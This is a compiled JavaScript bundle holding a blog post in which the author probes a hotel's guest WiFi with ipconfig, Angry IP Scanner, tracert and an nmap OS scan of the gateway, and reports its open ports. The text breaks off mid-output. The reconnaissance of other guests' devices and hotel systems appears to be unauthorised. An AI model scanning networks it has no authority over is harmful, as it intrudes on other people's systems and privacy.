(window.webpackJsonp=window.webpackJsonp||[]).push([[13],{170:function(t,a,s){t.exports=s.p+"assets/img/angry.jpg"},171:function(t,a,s){t.exports=s.p+"assets/img/80.jpg"},172:function(t,a,s){t.exports=s.p+"assets/img/81.jpg"},173:function(t,a,s){t.exports=s.p+"assets/img/81admin.jpg"},174:function(t,a,s){t.exports=s.p+"assets/img/444.jpg"},175:function(t,a,s){t.exports=s.p+"assets/img/1001.jpg"},176:function(t,a,s){t.exports=s.p+"assets/img/3128.jpg"},177:function(t,a,s){t.exports=s.p+"assets/img/8080.jpg"},178:function(t,a,s){t.exports=s.p+"assets/img/google.jpg"},513:function(t,a,s){"use strict";s.r(a);var e=s(2),n=Object(e.a)({},(function(){var t=this,a=t.$createElement,e=t._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("p",[t._v("I'm sitting here in my hotel room in Auckland, having driven a long way today - but I'm not tired. I've just connected to the hotel's free WiFi, which gets me thinking about a hotel I stayed in about 10 years ago in Brisbane, where I found that all the hotel's documents were accessible on an open SMB share on the wireless network. Hmmm, I wonder what the security's like here.")]),t._v(" "),e("h2",{attrs:{id:"ipconfig"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#ipconfig","aria-hidden":"true"}},[t._v("#")]),t._v(" IPConfig")]),t._v(" "),e("p",[t._v("Okay, so let's start by checking out what IP I've been given by the hotel DHCP, and what the gateway address is. We do this in Windows by running "),e("code",[t._v("ipconfig")]),t._v(".")]),t._v(" "),e("p",[t._v("The ipconfig command spits out a lot of text, but we're mainly interested in the Wireless LAN adapter and its Default Gateway (which I've highlighted below):")]),t._v(" "),e("div",{staticClass:"language-powershell extra-class"},[e("pre",{pre:!0,attrs:{class:"language-powershell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\> ipconfig\n\nWindows IP Configuration\n\n\nEthernet adapter Ethernet:\n\n   Media State "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" : Media disconnected\n   Connection"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("specific DNS Suffix  "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" :\n\nMobile Broadband adapter Cellular:\n\n   Media State "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" : Media disconnected\n   Connection"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("specific DNS Suffix  "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" :\n\nWireless LAN adapter Wi"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Fi:\n\n   Connection"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("specific DNS Suffix  "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" :\n   Link"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("local IPv6 Address "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" : fe80::5497:f277:a7e0:9a13"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("18\n   IPv4 Address"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" : 10"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("100"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("3"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("112\n   Subnet Mask "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" : 255"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("255"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("248"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0\n   Default Gateway "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" : 10"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("100"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1\n\nEthernet adapter Bluetooth Network Connection:\n\n   Media State "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" : Media disconnected\n   Connection"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("specific DNS Suffix  "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" :\n")])])]),e("h2",{attrs:{id:"angry-ip-scanner"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#angry-ip-scanner","aria-hidden":"true"}},[t._v("#")]),t._v(" Angry IP Scanner")]),t._v(" "),e("p",[t._v("Okay, so first things first - we can use "),e("a",{attrs:{href:"https://angryip.org/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Angry IP Scanner"),e("OutboundLink")],1),t._v(" to check for other machines on the network. This could be either other customers' devices or other hotel servers or devices.")]),t._v(" "),e("p",[e("img",{attrs:{src:s(170),alt:"Angry IP Scanner"}})]),t._v(" "),e("h2",{attrs:{id:"traceroute"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#traceroute","aria-hidden":"true"}},[t._v("#")]),t._v(" TraceRoute")]),t._v(" "),e("p",[t._v("We can also use "),e("code",[t._v("tracert")]),t._v(" to find out what devices there are beyond our local gateway. A traceroute can show us the IP of each device our data goes through on the way to a destination IP. In this instance, we'll start a traceroute to CloudFlare's DNS server at "),e("a",{attrs:{href:"https://1.1.1.1/",target:"_blank",rel:"noopener noreferrer"}},[t._v("1.1.1.1"),e("OutboundLink")],1),t._v(", and we'll turn off resolution of IP addresses to host names with -d (because it slows traceroute down a lot).")]),t._v(" "),e("div",{staticClass:"language-powershell extra-class"},[e("pre",{pre:!0,attrs:{class:"language-powershell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\> tracert "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("d 1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1\n\nTracing route to 1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1 over a maximum of 30 hops\n\n  1    <1 ms     1 ms     1 ms  10"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("100"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1\n  2     1 ms     1 ms     1 ms  203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx\n  3     3 ms     2 ms     2 ms  203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("97"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx\n  4     3 ms     3 ms     2 ms  198"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("41"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("236"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("254\n  5     3 ms     2 ms     3 ms  198"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("41"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("236"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("253\n  6     2 ms     2 ms     2 ms  1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1\n")])])]),e("p",[t._v("The second hop in our traceroute looks interesting - and is probably worth checking out further.")]),t._v(" "),e("h2",{attrs:{id:"nmap"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#nmap","aria-hidden":"true"}},[t._v("#")]),t._v(" NMap")]),t._v(" "),e("p",[t._v("To probe further, let's run an "),e("code",[t._v("nmap")]),t._v(" scan on our first IP address. nmap can check for open ports on an IP, and we can also use the -O switch to see if nmap can additionally figure out which OS the machine may be running.")]),t._v(" "),e("div",{staticClass:"language-powershell extra-class"},[e("pre",{pre:!0,attrs:{class:"language-powershell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\> nmap "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("O 10"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("100"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1\n\nStarting Nmap 7"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("80 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" https:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("nmap"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("org "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" at 2019"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("08"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("25 23:22 New Zealand Standard Time\nNmap scan report "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" 10"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("100"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1\nHost is up "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0020s latency"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\nNot shown: 992 closed ports\nPORT     STATE    SERVICE\n22"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp   filtered ssh\n80"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp   open     http\n81"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp   open     hosts2"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("ns\n443"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp  open     https\n444"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp  open     snpp\n1001"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp open     webpush\n3128"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp open     squid"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("http\n8080"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp open     http"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("proxy\nMAC Address: 40:A8:F0:36:xx:xx "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Hewlett Packard"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nNo exact OS matches "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" host "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("If")]),t._v(" you know what OS is running on it"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" see https:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("nmap"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("org"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("submit"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\nTCP"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("IP fingerprint:\nOS:SCAN"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("V=7"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("80"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("E=4"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("D=8"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("25"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("OT=80"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("CT=1"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("CU=34038"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("PV=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("DS=1"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("DC=D"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("G=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("M=40A8F0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("T\nOS:M=5D626F7F"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("P=i686"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("pc"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("windows"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("windows"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("SEQ"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("SP")]),t._v("=109"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("GCD=1"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("ISR=10A"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("TI=Z"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("CI=Z"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("\nOS:"),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("II")]),t._v("=I"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("TS=U"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("SEQ"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("CI=Z"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("II")]),t._v("=I"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("TS=U"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("OPS"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("O1=M5B4NWA"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O2=M5B4NWA"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O3=M5B4NWA"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O4=M5B\nOS:4NWA"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O5=M5B4NWA"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O6=M5B4"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("WIN"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("W1=7210"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W2=7210"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W3=7210"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W4=7210"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W5=7210"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W6=7\nOS:210"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("ECN"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("DF=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("T=40"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W=7210"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O=M5B4NWA"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("CC=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("Q="),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("T1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("DF=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("T=40"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("S=O"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("A=S"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("\nOS:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("F=AS"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("RD")]),t._v("=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("Q="),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("T2"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=N"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("T3"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=N"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("T4"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("DF=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("T=40"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("S=A"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("A=Z"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("F=R"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O="),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("RD")]),t._v("=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("Q="),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nOS:T5"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("DF=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("T=40"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("S=Z"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("A=S+"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("F=AR"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O="),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("RD")]),t._v("=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("Q="),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("T6"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("DF=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("T=40"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("S=A"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("A\nOS:=Z"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("F=R"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O="),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("RD")]),t._v("=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("Q="),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("T7"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("DF=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("T=40"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("W=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("S=Z"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("A=S+"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("F=AR"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("O="),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("RD")]),t._v("=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("Q="),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("U1"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("D\nOS:F=N"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("T=40"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("IPL=164"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("UN=0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("RIPL=G"),e("span",{pre:!0,attrs:{class:"token 